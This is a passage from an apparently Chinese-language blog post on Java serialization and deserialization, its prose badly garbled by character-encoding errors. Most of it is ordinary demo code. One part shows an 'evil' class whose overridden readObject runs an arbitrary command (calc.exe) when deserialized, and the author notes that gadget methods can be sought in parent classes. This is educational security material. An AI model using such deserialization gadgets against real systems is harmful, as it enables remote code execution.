class_">User</span>();</span><br><span class="line">user.setName(<span class="string">&quot;posty&quot;</span>);</span><br><span class="line"><span class="comment">//åºåˆ—åŒ–å¯¹è±¡</span></span><br><span class="line"><span class="type">byte</span>[] serializeData = serialize(user);</span><br><span class="line"><span class="comment">//æ–‡ä»¶æµï¼Œåˆ›å»ºæ–‡ä»¶user.binå¹¶å†™åºåˆ—åŒ–åçš„æ•°æ®</span></span><br><span class="line"><span class="type">FileOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;user.bin&quot;</span>);</span><br><span class="line">fout.write(serializeData);</span><br><span class="line">fout.close();</span><br><span class="line"><span class="comment">// (User)è¡¨ç¤ºæŠŠååºåˆ—åŒ–åçš„å¯¹è±¡è½¬ä¸ºUserå¯¹è±¡ï¼Œå¹¶èµ‹å€¼ç»™å·²ç»å£°æ˜ä¸ºUserç±»çš„å˜é‡user2</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> (User) unserialize(serializeData);</span><br><span class="line"><span class="comment">//è°ƒç”¨Userçš„getNameæ–¹æ³•</span></span><br><span class="line">System.out.print(user2.getName());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>####Java æ–¹æ³•é‡å†™</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> qingchuan.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evil</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String cmd;</span><br><span class="line">    <span class="comment">//åŸæµ‹è¯•ä¸ºpublicä¸æˆåŠŸ, æ”¹ä¸ºprivate</span></span><br><span class="line">    <span class="comment">//é‡å†™readObject()ååºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream stream)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="comment">//é»˜è®¤ååºåˆ—åŒ–ï¼Œååºåˆ—åŒ–éé™æ€éç¬æ€å­—æ®µ</span></span><br><span class="line">        stream.defaultReadObject();</span><br><span class="line">        <span class="comment">//è°ƒç”¨execæ–¹æ³•æ‰§è¡Œå‘½ä»¤cmd</span></span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> qingchuan.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(<span class="keyword">final</span> Object obj )<span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–ï¼Œè¿”å›å€¼ä¸ºå­—èŠ‚ç±»å‹ï¼Œè¾“å…¥å€¼ä¸ºå¯¹è±¡Object</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">btout</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        ObjectOutputStream objOut=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(btout);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ›å»ºobjout å¯¹è±¡è¾“å‡ºæµå®ä¾‹ï¼Œä¹Ÿæ˜¯ç±»ä¼¼ä»¥ä¸Šçš„è¯»æ•°æ®ï¼Œä¸è¿‡æ“ä½œçš„æ˜¯å¯¹è±¡æµï¼Œä¸æ˜¯å­—èŠ‚æµï¼ŒååŠ›æ¶åŒ–å¯¹è±¡çš„ç±»ï¼Œä½¿å…¶ç¼–çš„å¯ä»¥ä¼ è¾“ï¼Œæ“ä½œ</span></span><br><span class="line">        objOut.writeObject(obj);<span class="comment">//è°ƒç”¨è¾“å‡ºå¯¹è±¡ä¸ºæµçš„å¯¹è±¡æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;<span class="comment">//ååºåˆ—åŒ–ï¼Œè¿”å›å€¼ç±»å‹ä¸ºå¯¹è±¡ç±»å‹ï¼Œè¾“å…¥ä¸ºå­—èŠ‚ç±»å‹</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] serialize)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">btin</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialize);</span><br><span class="line">        ObjectInputStream objIn=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//æ¶æ„cmdæµ‹è¯•</span></span><br><span class="line">        <span class="type">evil</span> <span class="variable">evil</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">evil</span>();</span><br><span class="line">        evil.cmd = <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–å¯¹è±¡evilå¹¶ä¼ é€’èš•é£Ÿå‡ºé—¨çš„=â€œcalcã€‚exeâ€ï¼›</span></span><br><span class="line">        <span class="type">byte</span>[] serializeData=serialize(evil);</span><br><span class="line">        <span class="comment">//é€šè¿‡è‡ªå®šä¹‰çš„readObjectååºåˆ—åŒ–</span></span><br><span class="line">        <span class="comment">//ä¼ é€’å‚æ•°cmd,æ‰§è¡Œäº†æ¶æ„çš„redaObjectï¼ˆï¼‰æ–¹æ³•</span></span><br><span class="line">        unserialize(serializeData);</span><br><span class="line">        System.out.println(evil.cmd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>####Java ç»§æ‰¿ä¸å‘ä¸Šè½¬å‹</p><pre><code>   å½“ä½¿ç”¨å¤šæ€æ–¹å¼è°ƒç”¨æ–¹æ³•æ—¶ï¼Œé¦–å…ˆæ£€æŸ¥çˆ¶ç±»ä¸­æ˜¯å¦æœ‰è¯¥æ–¹æ³•ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™ç¼–è¯‘é”™è¯¯ï¼›å¦‚æœæœ‰ï¼Œå†å»è°ƒç”¨å­ç±»çš„åŒåæ–¹æ³•ã€‚</code></pre><p>å¤šæ€çš„å¥½å¤„ï¼šå¯ä»¥ä½¿ç¨‹åºæœ‰è‰¯å¥½çš„æ‰©å±•ï¼Œå¹¶å¯ä»¥å¯¹æ‰€æœ‰ç±»çš„å¯¹è±¡è¿›è¡Œé€šç”¨å¤„ç†ã€‚</p><pre><code>å‘ä¸Šè½¬å‹çš„å¯¹è±¡è°ƒâ½¤çš„â½…æ³•æ˜¯â¼¦ç±»è¦†ç›–æˆ–ç»§æ‰¿â½—ç±»çš„â½…æ³•ï¼Œä¸æ˜¯â½—ç±»çš„â½…æ³•å‘ä¸Šè½¬å‹çš„å¯¹è±¡â½†æ³•è°ƒâ½¤â¼¦ç±»ç‰¹æœ‰çš„â½…æ³•</code></pre><p>å…¶å®å‘ä¸Šè½¬å‹å°±æ˜¯å¤šæ€çš„ä¸€ç§å®ç°æ–¹å¼ï¼Œåœ¨ååºåˆ—åŒ–ä¸­ï¼Œå¦‚æœåœ¨æŸä¸€ä¸ªç±»ä¸­æ‰¾ä¸åˆ°å¯ä»¥å®ç°æ¶æ„æ–¹æ³•ï¼Œå°±å¯ä»¥å»ä»–çš„çˆ¶ç±»æ‰¾ï¼Œæˆ–è€…çˆ¶ç±»çš„çˆ¶ç±»ã€‚</p><h4 id="Java-æ¥å£å’Œå›è°ƒ"><a href="#Java-æ¥å£å’Œå›è°ƒ" class="headerlink" title="Java æ¥å£å’Œå›è°ƒ"></a>Java æ¥å£å’Œå›è°ƒ</h4><p>â€‹    Javaçš„æ¥å£ï¼ˆinterfaceï¼‰å®šä¹‰äº†çº¯æŠ½è±¡è§„èŒƒï¼Œä¸€ä¸ªç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£ã€‚</p><ul><li>æ¥å£ä¹Ÿæ˜¯æ•°æ®ç±»å‹ï¼Œé€‚ç”¨äºå‘ä¸Šè½¬å‹å’Œå‘ä¸‹è½¬å‹ï¼›</li><li>æ¥å£çš„æ‰€æœ‰æ–¹æ³•éƒ½æ˜¯æŠ½è±¡æ–¹æ³•ï¼Œæ¥å£ä¸èƒ½å®šä¹‰å®ä¾‹å­—æ®µï¼›</li><li>æ¥å£å¯ä»¥å®šä¹‰defaultæ–¹æ³•ï¼ˆJDK&gt;&#x3D;1.8ï¼‰ã€‚</li><li></li><li><pre><code class="java">package qingchuan.java;//å®šä¹‰ä¸€ä¸ªPeopleæ¥å£interface People &#123;    //æ¥å£çš„æ–¹æ³•peopleList()    void peopleList();&#125;//Studentsç»§æ‰¿æ¥å£class Student implements People &#123;    public void peopleList() &#123;        System.out.println(&quot;Iâ€™m a student.&quot;);    &#125;&#125;//Teacherç»§æ‰¿æ¥å£class Teacher implements People &#123;    public void peopleList() &#123;        System.out.println(&quot;Iâ€™m a teacher.&quot;);    &#125;&#125;public class Interface_test &#123;    public static void main(String args[]) &#123;        People a;          //å£°æ˜æ¥å£å˜é‡        a = new Student(); //å®ä¾‹åŒ–ï¼Œæ¥å£å˜é‡ä¸­å­˜æ”¾å¯¹è±¡çš„å¼•ç”¨        a.peopleList();    //æ¥å£å›è°ƒ,è°ƒç”¨Studentç±»çš„peopleList()æ–¹æ³•        a = new Teacher(); //å®ä¾‹åŒ–ï¼Œæ¥å£å˜é‡ä¸­å­˜æ”¾å¯¹è±¡çš„å¼•ç”¨        a.peopleList();    //æ¥å£å›è°ƒ,è°ƒç”¨Teacherç±»çš„peopleList()æ–¹æ³•    &#125;    // ç»“æœï¼š    // Iâ€™m a student.    // Iâ€™m a teacher.&#125;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##ä¸€ã€ç†è§£Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–</span><br><span class="line"></span><br><span class="line">Serialization(åºåˆ—åŒ–)ï¼šå°†javaå¯¹è±¡ä»¥ä¸€è¿ä¸²çš„å­—èŠ‚ä¿å­˜åœ¨ç£ç›˜æ–‡ä»¶ä¸­çš„è¿‡ç¨‹ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯ä¿å­˜javaå¯¹è±¡çŠ¶æ€çš„è¿‡ç¨‹ã€‚åºåˆ—åŒ–å¯ä»¥å°†æ•°æ®æ°¸ä¹…ä¿å­˜åœ¨ç£ç›˜ä¸Š(é€šå¸¸ä¿å­˜åœ¨æ–‡ä»¶ä¸­)ã€‚</span><br><span class="line"></span><br><span class="line">deserialization(ååºåˆ—åŒ–)ï¼šå°†ä¿å­˜åœ¨ç£ç›˜æ–‡ä»¶ä¸­çš„javaå­—èŠ‚ç é‡æ–°è½¬æ¢æˆjavaå¯¹è±¡ç§°ä¸ºååºåˆ—åŒ–ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">###ä¸ºä»€ä¹ˆéœ€è¦åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Ÿï¼Ÿ</span><br><span class="line"></span><br><span class="line"> æˆ‘ä»¬çŸ¥é“ï¼Œå½“ä¸¤ä¸ªè¿›ç¨‹è¿›è¡Œè¿œç¨‹é€šä¿¡æ—¶ï¼Œå¯ä»¥ç›¸äº’å‘é€å„ç§ç±»å‹çš„æ•°æ®ï¼ŒåŒ…æ‹¬æ–‡æœ¬ã€å›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ç­‰ï¼Œ è€Œè¿™äº›æ•°æ®éƒ½ä¼šä»¥äºŒè¿›åˆ¶åºåˆ—çš„å½¢å¼åœ¨ç½‘ç»œä¸Šä¼ é€ã€‚é‚£ä¹ˆå½“ä¸¤ä¸ªJavaè¿›ç¨‹è¿›è¡Œé€šä¿¡æ—¶ï¼Œèƒ½å¦å®ç°è¿›ç¨‹é—´çš„å¯¹è±¡ä¼ é€å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å¯ä»¥çš„ã€‚å¦‚ä½•åšåˆ°å‘¢ï¼Ÿè¿™å°±éœ€è¦Javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–äº†ã€‚æ¢å¥è¯è¯´ï¼Œä¸€æ–¹é¢ï¼Œå‘é€æ–¹éœ€è¦æŠŠè¿™ä¸ªJavaå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—ï¼Œç„¶ååœ¨ç½‘ç»œä¸Šä¼ é€ï¼›å¦ä¸€æ–¹é¢ï¼Œæ¥æ”¶æ–¹éœ€è¦ä»å­—èŠ‚åºåˆ—ä¸­æ¢å¤å‡ºJavaå¯¹è±¡ã€‚</span><br><span class="line"></span><br><span class="line"> å½“æˆ‘ä»¬æ˜æ™°äº†ä¸ºä»€ä¹ˆéœ€è¦Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–åï¼Œæˆ‘ä»¬å¾ˆè‡ªç„¶åœ°ä¼šæƒ³Javaåºåˆ—åŒ–çš„å¥½å¤„ã€‚å…¶å¥½å¤„ä¸€æ˜¯å®ç°äº†æ•°æ®çš„æŒä¹…åŒ–ï¼Œé€šè¿‡åºåˆ—åŒ–å¯ä»¥æŠŠæ•°æ®æ°¸ä¹…åœ°ä¿å­˜åˆ°ç¡¬ç›˜ä¸Šï¼ˆé€šå¸¸å­˜æ”¾åœ¨æ–‡ä»¶é‡Œï¼‰ï¼ŒäºŒæ˜¯ï¼Œåˆ©ç”¨åºåˆ—åŒ–å®ç°è¿œç¨‹é€šä¿¡ï¼Œå³åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„å­—èŠ‚åºåˆ—ã€‚</span><br><span class="line"></span><br><span class="line">â‘  æƒ³æŠŠå†…å­˜ä¸­çš„å¯¹è±¡ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­æˆ–è€…æ•°æ®åº“ä¸­æ—¶å€™ï¼›</span><br><span class="line">â‘¡ æƒ³ç”¨å¥—æ¥å­—åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„æ—¶å€™ï¼›</span><br><span class="line">â‘¢ æƒ³é€šè¿‡RMIï¼ˆè¿œç¨‹ï¼‰ä¼ è¾“å¯¹è±¡çš„æ—¶å€™</span><br><span class="line"></span><br><span class="line">## åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å®ç°</span><br><span class="line"></span><br><span class="line"> åªæœ‰å®ç°äº†Serializableæˆ–è€…Externalizableæ¥å£çš„ç±»çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ä¸ºå­—èŠ‚åºåˆ—ã€‚ï¼ˆä¸æ˜¯åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ï¼‰ </span><br><span class="line"></span><br><span class="line">æˆ‘ä»¬æ–°å»º3ä¸ªç±»ï¼Œæµ‹è¯•ä¸€ä¸‹åºåˆ—åŒ–å’Œååºåˆ—åŒ–</span><br><span class="line"></span><br><span class="line">Personç±»</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">package QIngchaun;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class SerializationTest &#123;</span><br><span class="line">public  static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">    ObjectOutputStream oos =new ObjectOutputStream((new FileOutputStream(&quot;ser.bin&quot;)));</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">&#125;</span><br><span class="line">public static void main(String[] args)throws Exception&#123;</span><br><span class="line">    Person person = new Person(&quot;aa&quot;,22);</span><br><span class="line">    System.out.println(person);</span><br><span class="line">   serialize(person);</span><br><span class="line">&#125;</span><br><span class="line">&#125;package QIngchaun;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class Person implements Serializable &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line">    public Person()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public Person(String name,int age)&#123;</span><br><span class="line">        this.name=name;</span><br><span class="line">        this.age=age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;Person&#123;&quot;+</span><br><span class="line">                &quot;name:&#x27;&quot;+name+&#x27;\&#x27;&#x27;+</span><br><span class="line">                &quot;,age=&quot;+age +</span><br><span class="line">                &#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre></li></ul><p>Serializeç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> QIngchaun;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line"><span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>((<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>)));</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">    System.out.println(person);</span><br><span class="line">   serialize(person);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Unserializeç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> QIngchaun;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserlialize</span><span class="params">(String Filename)</span><span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span>ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span>(Person)unserlialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹ä¸Šé¢çš„2ä¸ªæ“ä½œæ–‡ä»¶æµçš„ç±»çš„ç®€å•è¯´æ˜</p><p>ObjectOutputStreamä»£è¡¨å¯¹è±¡è¾“å‡ºæµï¼š</p><p>å®ƒçš„writeObject(Object obj)æ–¹æ³•å¯å¯¹å‚æ•°æŒ‡å®šçš„objå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ï¼ŒæŠŠå¾—åˆ°çš„å­—èŠ‚åºåˆ—å†™åˆ°ä¸€ä¸ªç›®æ ‡è¾“å‡ºæµä¸­ã€‚</p><p>ObjectInputStreamä»£è¡¨å¯¹è±¡è¾“å…¥æµï¼š</p><p>å®ƒçš„readObject()æ–¹æ³•ä»ä¸€ä¸ªæºè¾“å…¥æµä¸­è¯»å–å­—èŠ‚åºåˆ—ï¼Œå†æŠŠå®ƒä»¬ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å°†å…¶è¿”å›ã€‚<br>3. ä¸€ä¸ªå®ç° Serializable æ¥å£çš„å­ç±»ä¹Ÿæ˜¯å¯ä»¥è¢«åºåˆ—åŒ–çš„ã€‚</p><ol start="4"><li>é™æ€æˆå‘˜å˜é‡æ˜¯ä¸èƒ½è¢«åºåˆ—åŒ–</li></ol><p>åºåˆ—åŒ–æ˜¯é’ˆå¯¹å¯¹è±¡å±æ€§çš„ï¼Œè€Œé™æ€æˆå‘˜å˜é‡æ˜¯å±äºç±»çš„ã€‚</p><p>transient æ ‡è¯†çš„å¯¹è±¡æˆå‘˜å˜é‡ä¸å‚ä¸åºåˆ—åŒ–</p><p>transientå®ä¾‹ï¼šæˆ‘ä»¬åœ¨nameå‰åŠ äº†transientï¼Œååºåˆ—åŒ–çš„æ—¶å€™ç»“æœå°†æ˜¾ç¤ºä¸ºç©º</p><p><img src="/2023/09/22/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image/image-20230922112645214-1700990359045-192-1700994555769-165.png"></p><p><img src="/2023/09/22/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image/image-20230922112902823-1700990359045-191-1700994555769-166.png"></p><p>åœ¨ä¸‹é¢è¿™ä¸ªæ —å­ä¸­ï¼ŒMyList è¿™ä¸ªç±»å®šä¹‰äº†ä¸€ä¸ª arr æ•°ç»„å±æ€§ï¼Œåˆå§‹åŒ–çš„æ•°ç»„é•¿åº¦ä¸º 100ã€‚åœ¨å®é™…åºåˆ—åŒ–æ—¶å¦‚æœè®© arr å±æ€§å‚ä¸åºåˆ—åŒ–çš„è¯ï¼Œé‚£ä¹ˆé•¿åº¦ä¸º 100 çš„æ•°ç»„éƒ½ä¼šè¢«åºåˆ—åŒ–ä¸‹æ¥ï¼Œä½†æ˜¯æˆ‘åœ¨æ•°ç»„ä¸­å¯èƒ½åªå­˜æ”¾ 30 ä¸ªæ•°ç»„è€Œå·²ï¼Œè¿™æ˜æ˜¾æ˜¯ä¸å¯ç†çš„ï¼Œæ‰€ä»¥è¿™é‡Œå°±è¦è‡ªå®šä¹‰åºåˆ—åŒ–è¿‡ç¨‹å•¦ï¼Œå…·ä½“çš„åšæ³•æ˜¯å†™ä»¥ä¸‹ä¸¤ä¸ª private æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">private void writeObject(java.io.ObjectOutputStream s)throws java.io.IOException</span><br><span class="line">private void readObject(java.io.ObjectInputStream s)throws java.io.IOException, ClassNotFoundExceptionja</span><br></pre></td></tr></table></figure><p>ä»è¿™ä¸¤ä¸ªæ–¹æ³•çš„åå­—å°±å¯ä»¥çœ‹å‡ºåˆ†åˆ«æ˜¯åºåˆ—åŒ–å†™å…¥æ•°æ®å’Œååºåˆ—åŒ–è¯»å–æ•°æ®ç”¨çš„ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªæ–¹æ³•æ˜¯åœ¨å“ªé‡Œä½¿ç”¨å‘¢ï¼Ÿå…¶å®åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šé€šè¿‡<code>åå°„</code>è°ƒç”¨çš„ï¼Œå…·ä½“ä¸‹é¢ä¼šåˆ†æè¿™ä¸ªè¿‡ç¨‹å“¦ã€‚</p><blockquote><p>ç°åœ¨æ¥çœ‹çœ‹è¿™ä¸ª transient åº”ç”¨:</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 